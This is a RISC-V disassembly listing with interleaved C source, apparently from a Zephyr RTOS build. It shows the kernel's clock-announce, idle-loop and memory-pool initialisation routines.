80044f44:	bff1                	j	80044f20 <z_set_timeout_expiry+0x1e>
			z_clock_set_timeout(ticks, idle);
80044f46:	85ce                	mv	a1,s3
80044f48:	854a                	mv	a0,s2
80044f4a:	acaff0ef          	jal	ra,80044214 <z_clock_set_timeout>
80044f4e:	bff1                	j	80044f2a <z_set_timeout_expiry+0x28>
		}
	}
}
80044f50:	40f2                	lw	ra,28(sp)
80044f52:	4462                	lw	s0,24(sp)
80044f54:	44d2                	lw	s1,20(sp)
80044f56:	4942                	lw	s2,16(sp)
80044f58:	49b2                	lw	s3,12(sp)
80044f5a:	6105                	addi	sp,sp,32
80044f5c:	8082                	ret

80044f5e <z_clock_announce>:

void z_clock_announce(s32_t ticks)
{
80044f5e:	1141                	addi	sp,sp,-16
80044f60:	c606                	sw	ra,12(sp)
80044f62:	c422                	sw	s0,8(sp)
80044f64:	c226                	sw	s1,4(sp)
80044f66:	84aa                	mv	s1,a0
#ifdef CONFIG_TIMESLICING
	z_time_slice(ticks);
80044f68:	afdff0ef          	jal	ra,80044a64 <z_time_slice>
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044f6c:	4421                	li	s0,8
80044f6e:	30043473          	csrrc	s0,mstatus,s0
80044f72:	8821                	andi	s0,s0,8
#endif

	k_spinlock_key_t key = k_spin_lock(&timeout_lock);

	announce_remaining = ticks;
80044f74:	800477b7          	lui	a5,0x80047
80044f78:	dc97a423          	sw	s1,-568(a5) # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>

	while (first() != NULL && first()->dticks <= announce_remaining) {
80044f7c:	dc1ff0ef          	jal	ra,80044d3c <first>
80044f80:	84aa                	mv	s1,a0
80044f82:	cd29                	beqz	a0,80044fdc <z_clock_announce+0x7e>
80044f84:	4510                	lw	a2,8(a0)
80044f86:	800477b7          	lui	a5,0x80047
80044f8a:	dc87a683          	lw	a3,-568(a5) # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>
80044f8e:	04c6c763          	blt	a3,a2,80044fdc <z_clock_announce+0x7e>
		struct _timeout *t = first();
		int dt = t->dticks;

		curr_tick += dt;
80044f92:	80047737          	lui	a4,0x80047
80044f96:	d9870713          	addi	a4,a4,-616 # 80046d98 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d99>
80044f9a:	41f65813          	srai	a6,a2,0x1f
80044f9e:	431c                	lw	a5,0(a4)
80044fa0:	434c                	lw	a1,4(a4)
80044fa2:	00c78533          	add	a0,a5,a2
80044fa6:	00f537b3          	sltu	a5,a0,a5
80044faa:	95c2                	add	a1,a1,a6
80044fac:	97ae                	add	a5,a5,a1
80044fae:	c308                	sw	a0,0(a4)
80044fb0:	c35c                	sw	a5,4(a4)
		announce_remaining -= dt;
80044fb2:	8e91                	sub	a3,a3,a2
80044fb4:	800477b7          	lui	a5,0x80047
80044fb8:	dcd7a423          	sw	a3,-568(a5) # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>
		t->dticks = 0;
80044fbc:	0004a423          	sw	zero,8(s1)
		remove_timeout(t);
80044fc0:	8526                	mv	a0,s1
80044fc2:	da7ff0ef          	jal	ra,80044d68 <remove_timeout>
			  : "r" (key & SOC_MSTATUS_IEN)
80044fc6:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044fc8:	30042473          	csrrs	s0,mstatus,s0

		k_spin_unlock(&timeout_lock, key);
		t->fn(t);
80044fcc:	44dc                	lw	a5,12(s1)
80044fce:	8526                	mv	a0,s1
80044fd0:	9782                	jalr	a5
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044fd2:	4421                	li	s0,8
80044fd4:	30043473          	csrrc	s0,mstatus,s0
80044fd8:	8821                	andi	s0,s0,8
80044fda:	b74d                	j	80044f7c <z_clock_announce+0x1e>
		key = k_spin_lock(&timeout_lock);
	}

	if (first() != NULL) {
80044fdc:	c881                	beqz	s1,80044fec <z_clock_announce+0x8e>
		first()->dticks -= announce_remaining;
80044fde:	449c                	lw	a5,8(s1)
80044fe0:	80047737          	lui	a4,0x80047
80044fe4:	dc872703          	lw	a4,-568(a4) # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>
80044fe8:	8f99                	sub	a5,a5,a4
80044fea:	c49c                	sw	a5,8(s1)
	}

	curr_tick += announce_remaining;
80044fec:	80047737          	lui	a4,0x80047
80044ff0:	d9870713          	addi	a4,a4,-616 # 80046d98 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d99>
80044ff4:	80047637          	lui	a2,0x80047
80044ff8:	dc860613          	addi	a2,a2,-568 # 80046dc8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc9>
80044ffc:	4214                	lw	a3,0(a2)
80044ffe:	41f6d513          	srai	a0,a3,0x1f
80045002:	431c                	lw	a5,0(a4)
80045004:	434c                	lw	a1,4(a4)
80045006:	96be                	add	a3,a3,a5
80045008:	00f6b7b3          	sltu	a5,a3,a5
8004500c:	95aa                	add	a1,a1,a0
8004500e:	97ae                	add	a5,a5,a1
80045010:	c314                	sw	a3,0(a4)
80045012:	c35c                	sw	a5,4(a4)
	announce_remaining = 0;
80045014:	00062023          	sw	zero,0(a2)

	z_clock_set_timeout(next_timeout(), false);
80045018:	d9bff0ef          	jal	ra,80044db2 <next_timeout>
8004501c:	4581                	li	a1,0
8004501e:	9f6ff0ef          	jal	ra,80044214 <z_clock_set_timeout>
			  : "r" (key & SOC_MSTATUS_IEN)
80045022:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80045024:	30042473          	csrrs	s0,mstatus,s0

	k_spin_unlock(&timeout_lock, key);
}
80045028:	40b2                	lw	ra,12(sp)
8004502a:	4422                	lw	s0,8(sp)
8004502c:	4492                	lw	s1,4(sp)
8004502e:	0141                	addi	sp,sp,16
80045030:	8082                	ret

80045032 <sys_power_save_idle>:
	_kernel.idle = ticks;
#endif
}

static void sys_power_save_idle(void)
{
80045032:	1141                	addi	sp,sp,-16
80045034:	c606                	sw	ra,12(sp)
	s32_t ticks = z_get_next_timeout_expiry();
80045036:	354d                	jal	80044ed8 <z_get_next_timeout_expiry>
	 * periods less than that.  This seems... silly, given that it
	 * saves no power and does not improve latency.  But it's an
	 * API we need to honor...
	 */
#ifdef CONFIG_SYS_CLOCK_EXISTS
	z_set_timeout_expiry((ticks < IDLE_THRESH) ? 1 : ticks, true);
80045038:	4789                	li	a5,2
8004503a:	00a7c363          	blt	a5,a0,80045040 <sys_power_save_idle+0xe>
8004503e:	4505                	li	a0,1
80045040:	4585                	li	a1,1
80045042:	35c1                	jal	80044f02 <z_set_timeout_expiry>
	if (_sys_suspend(ticks) == SYS_POWER_STATE_ACTIVE) {
		sys_pm_idle_exit_notify = 0U;
		k_cpu_idle();
	}
#else
	k_cpu_idle();
80045044:	878ff0ef          	jal	ra,800440bc <k_cpu_idle>
#endif
}
80045048:	40b2                	lw	ra,12(sp)
8004504a:	0141                	addi	sp,sp,16
8004504c:	8082                	ret

8004504e <idle>:
#else
#define IDLE_YIELD_IF_COOP() do { } while (false)
#endif

void idle(void *unused1, void *unused2, void *unused3)
{
8004504e:	1141                	addi	sp,sp,-16
80045050:	c606                	sw	ra,12(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
80045052:	47a1                	li	a5,8
80045054:	3007b7f3          	csrrc	a5,mstatus,a5
		k_yield();
	}
#else
	for (;;) {
		(void)irq_lock();
		sys_power_save_idle();
80045058:	3fe9                	jal	80045032 <sys_power_save_idle>

		IDLE_YIELD_IF_COOP();
8004505a:	bfe5                	j	80045052 <idle+0x4>

8004505c <k_mem_pool_init>:
{
	return pool - &_k_mem_pool_list_start[0];
}

static void k_mem_pool_init(struct k_mem_pool *p)
{
8004505c:	1141                	addi	sp,sp,-16
8004505e:	c606                	sw	ra,12(sp)
	SYS_DLIST_FOR_EACH_CONTAINER(&((wq)->waitq), thread_ptr, \
				     base.qnode_dlist)

static inline void z_waitq_init(_wait_q_t *w)
{
	sys_dlist_init(&w->waitq);
80045060:	01450713          	addi	a4,a0,20
	list->head = (sys_dnode_t *)list;
80045064:	c958                	sw	a4,20(a0)
	list->tail = (sys_dnode_t *)list;
80045066:	cd18                	sw	a4,24(a0)
	z_waitq_init(&p->wait_q);
	z_sys_mem_pool_base_init(&p->base);
80045068:	b15fe0ef          	jal	ra,80043b7c <z_sys_mem_pool_base_init>
}
8004506c:	40b2                	lw	ra,12(sp)
8004506e:	0141                	addi	sp,sp,16
80045070:	8082                	ret

80045072 <init_static_pools>:

int init_static_pools(struct device *unused)
{
80045072:	1141                	addi	sp,sp,-16
80045074:	c606                	sw	ra,12(sp)
80045076:	c422                	sw	s0,8(sp)
	ARG_UNUSED(unused);
	struct k_mem_pool *p;

	for (p = _k_mem_pool_list_start; p < _k_mem_pool_list_end; p++) {
80045078:	80047437          	lui	s0,0x80047
8004507c:	d7440413          	addi	s0,s0,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80045080:	800477b7          	lui	a5,0x80047
80045084:	d7478793          	addi	a5,a5,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80045088:	00f47663          	bgeu	s0,a5,80045094 <init_static_pools+0x22>
		k_mem_pool_init(p);
8004508c:	8522                	mv	a0,s0
8004508e:	37f9                	jal	8004505c <k_mem_pool_init>
	for (p = _k_mem_pool_list_start; p < _k_mem_pool_list_end; p++) {
80045090:	0471                	addi	s0,s0,28
80045092:	b7fd                	j	80045080 <init_static_pools+0xe>
	}

	return 0;
}
80045094:	4501                	li	a0,0
80045096:	40b2                	lw	ra,12(sp)
80045098:	4422                	lw	s0,8(sp)
8004509a:	0141                	addi	sp,sp,16
8004509c:	8082                	ret

8004509e <_OffsetAbsSyms>:
 * point regs
 */
GEN_ABSOLUTE_SYM(_K_THREAD_NO_FLOAT_SIZEOF,
		 STACK_ROUND_UP(sizeof(struct k_thread)));

GEN_ABS_SYM_END
8004509e:	8082                	ret
